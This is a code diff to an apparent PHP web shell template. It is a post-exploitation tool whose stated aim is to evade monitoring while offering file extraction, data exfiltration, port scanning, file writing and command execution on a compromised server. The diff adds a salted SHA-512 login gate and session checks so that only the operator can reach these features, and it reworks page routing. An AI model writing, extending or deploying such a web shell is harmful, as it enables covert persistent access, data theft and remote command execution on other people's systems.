@@ -12,8 +12,10 @@
  * monitoring system without rising any uncommon process tree nor disk operation.
  * The possibility to get discovered always exists, but the goal is to make it as hard as possible.
  */
+session_start();
 
 // Features name constants
+define("LOGIN", "__FEAT_LOGIN__");
 define("FILE_EXTRACTION", "__FEAT_FILE_EXTRACTION__");
 define("FILE_EXTRACTION_PREVIEW", "__FEAT_FILE_EXTRACTION_PREVIEW__");
 define("DIRECTORY_LISTING", "__FEAT_DIRECTORY_LISTING__");
@@ -21,6 +23,10 @@ define("EXFILTRATE", "__FEAT_EXFILTRATE__");
 define("PORT_SCAN", "__FEAT_PORT_SCAN__");
 define("WRITE_FILE", "__FEAT_WRITE_FILE__");
 define("RUN_COMMAND", "__FEAT_RUN_COMMAND__");
+
+define("USERNAME", "__USERNAME__");
+define("PASSWORD", "__PASSWORD__");
+define("SALT", "__SALT__");
 
 /**
  * Define the enabled features
@@ -224,7 +230,7 @@ function makeInput($type, $label, $name, $placeholder, $description, $required =
                 if ($required) {
                     echo "required ";
                 }
-                if($query_param !== null) {
+                if ($query_param !== null) {
                     echo "value=\"" . $_GET[$query_param] . "\" ";
                 }
                 ?>
@@ -349,6 +355,11 @@ function makeForm($operation, $action, $elements, $method = "post") {
  */
 function makePage($elements, $current_page) {
     global $ENABLED_FEATURES;
+    if ($_SESSION["auth"] !== true) {
+        header("Location: ?page=" . LOGIN);
+        die();
+    }
+
     ob_start();
     ?>
     <html lang="en">
@@ -389,6 +400,77 @@ function makePage($elements, $current_page) {
             </div>
         </main>
     </div>
+    <?php
+    return ob_get_clean();
+}
+
+/**
+ * Create a login page
+ *
+ * @return string
+ */
+function makeLoginPage() {
+    ob_start();
+    ?>
+    <html lang="en" class="h-full bg-zinc-900">
+    <head>
+        <title>__TITLE__</title>
+        <style>__CSS__</style>
+        <link rel="stylesheet" href="./compiled.css">
+    </head>
+    <body class="h-full">
+    <div class="flex min-h-full flex-col justify-center px-6 py-12 lg:px-8">
+        <div class="sm:mx-auto sm:w-full sm:max-w-sm">
+            <h2 class="mt-10 text-center text-2xl font-bold leading-9 tracking-tight text-white">
+                Sign in to your account
+            </h2>
+        </div>
+
+        <div class="mt-10 sm:mx-auto sm:w-full sm:max-w-sm">
+            <form class="space-y-6" action="<?php echo $_SERVER["REQUEST_URI"]; ?>" method="post">
+                <div>
+                    <label for="__PARAM_1__" class="block text-sm font-medium leading-6 text-white">
+                        Username
+                    </label>
+                    <div class="mt-2">
+                        <input id="__PARAM_1__" name="__PARAM_1__" type="text" autocomplete="__PARAM_1__" required
+                               class="block w-full rounded-md border-0 bg-white/5 py-1.5 text-white shadow-sm ring-1
+                               ring-inset ring-white/10 focus:ring-2 focus:ring-inset focus:ring-indigo-500 sm:text-sm
+                               sm:leading-6"
+                               placeholder="admin"
+                        >
+                    </div>
+                </div>
+
+                <div>
+                    <div class="flex items-center justify-between">
+                        <label for="__PARAM_2__" class="block text-sm font-medium leading-6 text-white">
+                            Password
+                        </label>
+                    </div>
+                    <div class="mt-2">
+                        <input id="__PARAM_2__" name="__PARAM_2__" type="password" autocomplete="__PARAM_2__" required
+                               class="block w-full rounded-md border-0 bg-white/5 py-1.5 text-white shadow-sm ring-1
+                               ring-inset ring-white/10 focus:ring-2 focus:ring-inset focus:ring-indigo-500 sm:text-sm
+                               sm:leading-6"
+                               placeholder="&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;"
+                        >
+                    </div>
+                </div>
+
+                <div>
+                    <button type="submit"
+                            class="flex w-full justify-center rounded-md bg-indigo-500 px-3 py-1.5 text-sm
+                            font-semibold leading-6 text-white shadow-sm hover:bg-indigo-400 focus-visible:outline
+                            focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-500">
+                        Sign in
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+    </body>
+    </html>
     <?php
     return ob_get_clean();
 }
@@ -937,6 +1019,17 @@ function handleWriteFile() {
     out("File written successfully.");
 }
 
+function handleLogin() {
+    $username = hash("sha512", $_POST["__PARAM_1__"] . SALT);
+    $password = hash("sha512", $_POST["__PARAM_2__"] . SALT);
+
+    if ($username === USERNAME && $password === PASSWORD) {
+        $_SESSION["auth"] = true;
+        header("Location: ?page=" . FILE_EXTRACTION);
+        die();
+    }
+}
+
 // Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
 // on the page except the operation result.
 $isolated_ops = array(
@@ -946,11 +1039,14 @@ $isolated_ops = array(
 
 // Check if the request is not POST and the operation is not in the isolated operations list, then render the page
 if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops))) {
-    $page = isset($_GET['page']) ? $_GET['page'] : FILE_EXTRACTION;
+    $page = isset($_GET['page']) ? $_GET['page'] : LOGIN;
 
     $content = "";
 
     switch ($page) {
+        case LOGIN:
+            $content = makeLoginPage();
+            break;
         case FILE_EXTRACTION_PREVIEW:
         case FILE_EXTRACTION:
             $content = makePage(
@@ -978,7 +1074,13 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "Display preview of the file content if it's larger than 100kb.",
                                 $page === FILE_EXTRACTION_PREVIEW,
                                 "y",
-                                "window.location.href = '?page=" . FILE_EXTRACTION_PREVIEW . "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
+                                $page === FILE_EXTRACTION_PREVIEW
+                                    ? "window.location.href = '?page=" .
+                                      FILE_EXTRACTION .
+                                      "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
+                                    : "window.location.href = '?page=" .
+                                      FILE_EXTRACTION_PREVIEW .
+                                      "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
                             ),
                             makeCheckbox(
                                 "__PARAM_3__",
@@ -1172,7 +1274,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
 
     echo $content;
 
-    if (isPost()) {
+    if (isPost() && in_array($_POST["__OPERATION__"], $isolated_ops) && $_POST["__OPERATION__"] !== LOGIN) {
         openCommandOutputScreen();
     }
 }
@@ -1181,6 +1283,9 @@ if (isPost()) {
     $operation = $_POST["__OPERATION__"];
 
     switch ($operation) {
+        case LOGIN:
+            handleLogin();
+            break;
         case FILE_EXTRACTION_PREVIEW:
         case FILE_EXTRACTION:
             handleFileExtraction();
@@ -1207,7 +1312,9 @@ if (isPost()) {
 }
 
 // Check if the request is not POST and the operation is not in the isolated operations list, then render the page end
-if (!isPost() && (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops))) {
+if (!isPost() &&
+    (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops)) &&
+    $_POST["__OPERATION__"] !== LOGIN) {
     closeCommandOutputScreen();
 }
 ?>
